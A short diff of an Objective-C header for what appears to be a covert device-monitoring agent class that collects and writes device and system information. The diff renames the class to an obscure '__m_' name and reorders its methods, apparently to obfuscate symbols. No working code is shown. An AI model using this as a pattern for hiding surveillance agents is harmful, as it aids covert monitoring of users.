@@ -10,26 +10,31 @@
 
 #import "RCSMLogManager.h"
 
-@interface RCSMAgentDevice : NSObject 
+@interface __m_MAgentDevice : NSObject 
 {    
 @private
   NSMutableDictionary *mAgentConfiguration;
 }
 
-+ (RCSMAgentDevice *)sharedInstance;
-+ (id)allocWithZone: (NSZone *)aZone;
++ (__m_MAgentDevice *)sharedInstance;
+
 - (id)copyWithZone: (NSZone *)aZone;
-- (id)retain;
++ (id)allocWithZone: (NSZone *)aZone;
+
 - (unsigned)retainCount;
+- (id)retain;
+
 - (void)release;
 - (id)autorelease;
 
-- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
 - (NSMutableDictionary *)mAgentConfiguration;
-- (BOOL)stop;
+- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
+
 - (void)start;
+- (BOOL)stop;
 - (BOOL)writeDeviceInfo: (NSData*)aInfo;
-- (BOOL)getDeviceInfo;
 - (NSData*)getSystemInfoWithType:(NSString*)aType;
+- (BOOL)getDeviceInfo;
+
 
 @end
